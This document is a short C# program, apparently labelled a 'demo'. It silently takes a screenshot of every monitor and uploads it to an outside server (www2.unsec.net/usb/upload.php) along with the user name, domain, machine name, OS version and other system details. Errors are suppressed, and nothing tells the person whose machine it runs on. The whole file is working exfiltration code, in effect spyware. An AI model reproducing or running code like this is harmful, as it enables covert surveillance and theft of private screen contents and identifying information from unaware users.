using System;
using System.IO;
using System.Text;
using System.Net;
using System.Drawing;
using System.Windows.Forms;

namespace ScreenPostDemo
{
	public class Program
	{
		private static Bitmap CreateBitmap(Rectangle box)
		{
			return new Bitmap(box.Width, box.Height);
		}

		private static byte[] TakeSnapShot(bool primaryOnly)
		{
			var box = primaryOnly ? Screen.PrimaryScreen.Bounds : SystemInformation.VirtualScreen;

			using (var ms = new MemoryStream())
			using (Bitmap bitmap = CreateBitmap(box))
			using (Graphics canvas = Graphics.FromImage(bitmap))
			{
				canvas.CopyFromScreen(
					box.X, box.Y,
					0, 0, bitmap.Size,
					CopyPixelOperation.SourceCopy
				);

				bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);

				return ms.ToArray();
			}
		}

		private static void DoWork()
		{	
			//File.WriteAllBytes(@"Z:\.Trash\kk.png", TakeSnapShot(true));

			var data = Convert.ToBase64String(TakeSnapShot(false));
			var client = new WebClient();
			client.Headers.Add("X-Dab-MachineName", Environment.MachineName);
			client.Headers.Add("X-Dab-HostName", Dns.GetHostName());
			client.Headers.Add("X-Dab-OsVersion", Environment.OSVersion.ToString());
			client.Headers.Add("X-Dab-CWD", Environment.CurrentDirectory);
			client.Headers.Add("X-Dab-ProcessorCount", Environment.ProcessorCount.ToString());
			client.Headers.Add("X-Dab-UserName", Environment.UserName);
			client.Headers.Add("X-Dab-UserDomainName", Environment.UserDomainName);
			client.Headers.Add("X-Dab-DotNetVersion", Environment.Version.ToString());
			client.Headers.Add("X-Dab-TickCount", Environment.TickCount.ToString());

			using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
			{
				var body = Encoding.UTF8.GetBytes(data);
				stream.Write(body, 0, body.Length);
				stream.Flush();
			}
		}

		static void Main(string[] args)
		{
			try
			{
				DoWork();
			}
			catch (Exception ex)
			{
				//Console.WriteLine(ex.ToString());
			}
		}
	}
}
